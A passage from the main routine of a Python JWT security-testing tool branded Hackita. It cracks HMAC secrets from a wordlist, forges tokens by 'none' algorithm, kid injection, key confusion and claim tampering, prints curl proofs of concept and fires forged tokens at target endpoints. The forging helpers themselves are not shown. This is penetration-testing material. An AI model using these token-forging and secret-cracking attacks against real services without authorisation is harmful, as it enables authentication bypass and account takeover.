            print(f"\n{DRED}{t('risk_score', score=total, level=level)}{RESET}")
        
        if "x5c" in info["header"] and HAS_CRYPTO:
            print(f"\n{DIM}{t('x5c_verifying')}{RESET}")
            try:
                ok = verify_x5c_leaf(info)
                print(f"  {GREEN if ok else RED}{t('x5c_valid') if ok else t('x5c_invalid')}{RESET}")
            except Exception as e:
                print(f"  {RED}{t('x5c_error', error=e)}{RESET}")

        if args.json:
            out = {
                "header": info["header"],
                "payload": info["payload"],
                "findings": [{"severity": s, "message": m} for s, m in findings]
            }
            print(json.dumps(out, indent=2))
    
    if args.crack:
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('cracking')}{RESET}")
        try:
            secret, attempts, elapsed, estimated_total = crack_hmac(token, args.crack, args.max_lines)
            rate = attempts / elapsed if elapsed > 0 else attempts
            if estimated_total:
                eta = estimated_total / rate if rate > 0 else 0
                print(f"{DIM}{t('crack_eta', total=estimated_total, eta=eta)}{RESET}")
            if secret:
                print(f"{GREEN}{t('secret_found', secret=secret)}{RESET}")
                print(f"{DIM}{t('crack_progress', count=attempts, elapsed=elapsed, rate=rate)}{RESET}")
                sys.exit(4)
            else:
                print(f"{YELLOW}{t('secret_not_found')}{RESET}")
                print(f"{DIM}{t('crack_progress', count=attempts, elapsed=elapsed, rate=rate)}{RESET}")
        except Exception as e:
            print(f"{RED}{t('error', error=e)}{RESET}")
            sys.exit(1)
    
    if args.attack and info["type"] == "JWS":
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('attack_mode', mode=args.attack.upper())}{RESET}")
        new_token = None
        try:
            if args.attack == "none":
                new_token = forge_none(info)
            elif args.attack == "kid":
                new_token = forge_kid(info)
            elif args.attack == "confusion":
                if not args.pubkey:
                    raise JwtError(t("pubkey_required"))
                with open(args.pubkey, "rb") as f:
                    new_token = forge_confusion(info, f.read())
            elif args.attack == "forge":
                if not args.secret:
                    raise JwtError(t("secret_required"))
                new_token = forge_claims(info, args.set, args.secret.encode(), args.jku, args.x5u)
        except Exception as e:
            print(f"{RED}{t('attack_failed', error=e)}{RESET}")
            sys.exit(1)
        
        if new_token:
            print(f"{GREEN}{t('forged_token')}{RESET}\n{new_token}")
            
            if args.poc and args.url:
                print(f"\n{YELLOW}{t('poc_generated')}{RESET}")
                print(t("poc_curl", method=args.method, url=args.url, token=new_token))

            if args.export_burp and args.url:
                try:
                    export_burp_request(args.export_burp, args.url, args.method, args.headers, new_token)
                    print(f"{GREEN}{t('burp_exported', file=args.export_burp)}{RESET}")
                except Exception as e:
                    print(f"{RED}{t('burp_export_error', error=e)}{RESET}")

            if args.verify_endpoint:
                test_http_endpoint(
                    args.verify_endpoint, args.method, args.headers,
                    new_token, original_token=token, insecure=args.insecure,
                    success_strings=args.success_strings,
                    failure_strings=args.failure_strings
                )
            elif args.url:
                test_http_endpoint(
                    args.url, args.method, args.headers,
                    new_token, original_token=token, insecure=args.insecure,
                    success_strings=args.success_strings,
                    failure_strings=args.failure_strings
                )
    
    elif args.secret or args.pubkey:
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('verification')}{RESET}")
        try:
            if args.secret:
                ok = verify_hmac(info, args.secret.encode())
                print(f"{GREEN if ok else RED}{t('sig_valid') if ok else t('sig_invalid')}{RESET}")
                if not ok:
                    sys.exit(3)
            elif args.pubkey:
                with open(args.pubkey, "rb") as f:
                    ok = verify_asymmetric(info, f.read())
                print(f"{GREEN if ok else RED}{t('sig_valid') if ok else t('sig_invalid')}{RESET}")
                if not ok:
                    sys.exit(3)
        except Exception as e:
            print(f"{RED}{t('verification_error', error=e)}{RESET}")
            sys.exit(1)
    
    # Footer (only if TTY)
    if sys.stdout.isatty():
        lang_urls = {
            "it": "https://hackita.it/articoli/jwt/",
            "en": "https://en.hackita.it/articoli/jwt/",
            "es": "https://es.hackita.it/articoli/jwt/",
            "pt": "https://pt.hackita.it/articoli/jwt/",
            "de": "https://de.hackita.it/articoli/jwt/",
            "fr": "https://fr.hackita.it/articoli/jwt/",
        }
        url = lang_urls.get(CURRENT_LANG, lang_urls["en"])
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}  Hackita  {WHITE}·  {DRED}JWT Security Testing Framework{RESET}")
        print(f"{WHITE}  {url}{RESET}")
        print(f"{DRED}=================================================={RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted.")
        sys.exit(130)
